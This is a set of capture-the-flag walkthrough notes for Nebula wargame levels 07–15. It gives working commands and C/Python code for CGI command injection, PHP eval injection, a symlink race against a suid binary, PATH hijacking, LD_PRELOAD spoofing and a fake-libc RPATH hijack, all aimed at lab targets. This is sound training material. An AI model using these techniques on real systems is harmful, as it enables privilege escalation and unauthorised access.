nebula-exercises
================
> notes about nebula exercises

> [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)


level 07
--------

##### inspect cgi script and use http get request to exploit 'Host' argument
```bash
# 1. inspect /home/flag07/thttpd.conf to get server port (7007)
# 2. man ascii shows that ';' hexa code is '0x3B'
# 3. inject getflag call
level07@nebula:~$ echo -e "GET http://nebula:7007/index.cgi?Host=%3B/bin/getflag HTTP/1.1\n\n" \
                  | nc -v nebula 7007
Connection to nebula 7007 port [tcp/afs3-bos] succeeded!
HTTP/1.0 200 OK
Content-type: text/html

<html>
<head><title>Ping results</title></head>
<body><pre>You have successfully executed getflag on a target account</pre></body>
</html>
```


level 08
--------

##### inspect capture.pcap and observe the login session
```bash
# wireshark may be used
packet nb 43: from 59.233.235.223 (@S) to 59.233.235.218 (@C)
--> "Password:"
then, one byte data character per packet from @C to @S:
--> ['b', 'a', 'c', 'k',          \
     'd', 'o', 'o', 'r',          \
     '0x7F', '0x7F', '0x7F', '0', \
     '0', 'R', 'm', '8',          \
     '0x7F', 'a', 't', 'e']

# man ascii shows that '0x7F' is DEL char
--> Password: backdOORmate
```

##### use password for flag08 user and execute getflag
```bash
level08@nebula:~$ su - flag08
Password: # backdOORmate
flag08@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 09
--------

##### see the deprecated \e option vulnerability of preg_replace php function
> ref: https://wiki.php.net/rfc/remove_preg_replace_eval_modifier

##### exploit $use_me to call getflag from the suid flag09 binary
```bash
level09@nebula:~$ echo '[email {${eval(system($use_me))}}]' > /tmp/getflag09.txt
level09@nebula:~$ /home/flag09/flag09 /tmp/getflag09.txt getflag
You have successfully executed getflag on a target account
PHP Parse error:  syntax error, unexpected T_STRING in /home/flag09/flag09.php(15) : regexp code(1) : eval()'d code on line 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1
```


level 10
--------

##### see man access
```bash
level10@nebula:~$ man access
The  check is done using the calling process's real UID and GID, rather than the effective IDs as
is done when actually attempting an operation (e.g., open(2)) on the file.  This allows set-user-
ID programs to easily determine the invoking user's authority.

# however:

Warning: Using access() to check if a user is authorized to, for  example,  open  a  file  before
actually doing so using open(2) creates a security hole, because the user might exploit the short
time interval between checking and opening the file to manipulate it.  For this reason,  the  use
of this system call should be avoided.

# --> exploit short time between:
# --> access(argv[1], R_OK) == 0 and ffd = open(file, O_RDONLY)
# --> to read /home/flag10/token with flag10 suid binary
```

##### run one loop to link a fake token with the real one
```bash
level10@nebula:~$ while true; do touch f_token; ln -sf /home/flag10/token f_token; rm f_token; done &
```

##### run another loop to read the real token with flag10 binary via the fake one
```bash
level10@nebula:~$ while true; do /home/flag10/flag10 f_token 127.0.0.1; done &
```

##### open a server tcp connection listening on port 18211 and wait for the real token
```bash
level10@nebula:~$ nc -kl localhost 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
.oO Oo.
```

##### use token as pwd for flag10 user and execute getflag
```bash
level10@nebula:~$ su - flag10
Password: # 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
flag10@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 11
--------

##### see man system
```bash
level11@nebula:~$ man system
Do not use system() from a program with set-user-ID or set-group-ID privileges,  because  strange
values for some environment variables might be used to subvert system integrity.  Use the exec(3)
family of functions instead, but not execlp(3) or execvp(3).  system() will not,  in  fact,  work
properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is
bash version 2, since bash 2 drops privileges on startup.

# --> it seems that a setresuid is missing within the 'process' method of basic.c
# --> even if getflag is injected in buffer, it will not be executed with flag11 suid
```

##### inpect source code and see man fread
```c
// main
if(fread(buf, length, 1, stdin) != length) // --> length == 1
{
    err(1, "fread length");
}

// process
buffer[i] ^= key; // --> 'c' = 'b' ^ 1
```
##### use a 1 byte length buffer: ['b'] and link 'c' to getflag
```bash
level11@nebula:~$ ln -sf /bin/getflag c
level11@nebula:~$ export PATH=/home/level11/:$PATH
# execute until null char
level11@nebula:~$ echo -e "Content-Length: 1\nb" | /home/flag11/flag11 
getflag is executing on a non-flag account, this doesn't count
```

level 12
--------

##### connect to process and inject getflag call
```bash
level12@nebula:~$ nc localhost 50001
Password: ; getflag > /tmp/getflag12.txt; #
Better luck next time

level12@nebula:~$ ll /tmp/getflag12.txt 
-rw-r--r-- 1 flag12 flag12 59 2016-08-19 13:33 /tmp/getflag12.txt

level12@nebula:~$ cat /tmp/getflag12.txt 
You have successfully executed getflag on a target account
```


level 13
--------

##### overload getuid call to return 'FAKEUID'
```c
// fake_getuid.c
#include <sys/types.h>

uid_t getuid()
{
    return 1000;
}
```

##### build lib and use LD_PRELOAD
```bash
level13@nebula:~$ gcc --shared -fPIC fake_getuid.c -o fake_getuid.so
level13@nebula:~$ export LD_PRELOAD=/home/level13/fake_getuid.so
```

##### copy flag13 binary to level13 home to use LD_PRELOAD trick
```bash
# LD_PRELOAD needs reel uid == effective uid
level13@nebula:~$ cp /home/flag13/flag13 /home/level13
level13@nebula:~$ ./flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

##### use token as pwd for flag13 user and execute getflag
```bash
level13@nebula:~$ su - flag13
Password: # b705702b-76a8-42b0-8844-3adabbe5ac58
flag13@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 14
--------

##### inspect flag14 binary

```bash
level14@nebula:~$ python -c "print 'a'*5" | /home/flag14/flag14 -e
abcde

level14@nebula:~$ python -c "print 'b'*5" | /home/flag14/flag14 -e
bcdef

# y = chr(ord(x) + pos(x))
```

##### write a reverse script
```python
# reverse.py
# read token in /home/flag14/token
token = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
reverse = ""

for i, c in enumerate(token):
    reverse += chr(ord(c) - i)

print(reverse)
# --> output: 8457c118-887c-4e40-a5a6-33a25353165
```

##### check reverse.py
```bash
python reverse.py | /home/flag14/flag14 -e
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
```

##### use reversed token as pwd for flag14 user and execute getflag
```
level14@nebula:~$ su - flag14
Password: # 8457c118-887c-4e40-a5a6-33a25353165
flag14@nebula:~$ getflag 
You have successfully executed getflag on a target account
```


level 15
--------

##### inspect flag15 binary

```bash
# 0. see 'man dlopen' for linker dynamic library search priority order
level15@nebula:~$ man dlopen
(ELF only) If the executable file for the calling program contains a DT_RPATH tag,
and does not contain a  DT_RUN‐PATH tag then the directories listed in the DT_RPATH tag are searched.

# 1. strace binary: trace system calls
level15@nebula:~$ strace /home/flag15/flag15
open("/var/tmp/flag15/libc.so.6", O_RDONLY)

# 2. readelf / objdump / nm binary: get more information about dynamic section and symbols

# readelf
level15@nebula:~$ readelf --dynamic /home/flag15/flag15 
Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

# objdump headers
level15@nebula:~$ objdump -x /home/flag15/flag15
Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15

# objdump dynamic symbols
level15@nebula:~$ objdump --dynamic-syms /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
080484cc g    DO .rodata	00000004  Base        _IO_stdin_used

# nm undefined symbols
level15@nebula:~$ nm --undefined-only /home/flag15/flag15 
w _Jv_RegisterClasses
w __gmon_start__
U __libc_start_main@@GLIBC_2.0
U puts@@GLIBC_2.0
```

##### build a fake libc calling the getflag binary

```c
// fake_libc.c
#include <sys/types.h>

void __cxa_finalize(void * d)
{

}

int __libc_start_main(
    int *(main) (int, char * *, char * *),
    int argc, char * * ubp_av, void (*init) (void),
    void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  system("getflag");
}
```
```
# version.map
GLIBC_2.0 {
        global:
		__libc_start_main;
};
```
```bash
# build dynamic fake lib with a version script and static link
level15@nebula:~$ gcc --shared -fPIC -static-libgcc -Wl,--version-script=./version.map,-Bstatic fake_libc.c -o libc.so.6
```

##### copy it to RPATH

```bash
level15@nebula:~$ cp libc.so.6 /var/tmp/flag15/
```

##### run suid flag15
```bash
level15@nebula:~$ /home/flag15/flag15 
You have successfully executed getflag on a target account
Segmentation fault
```
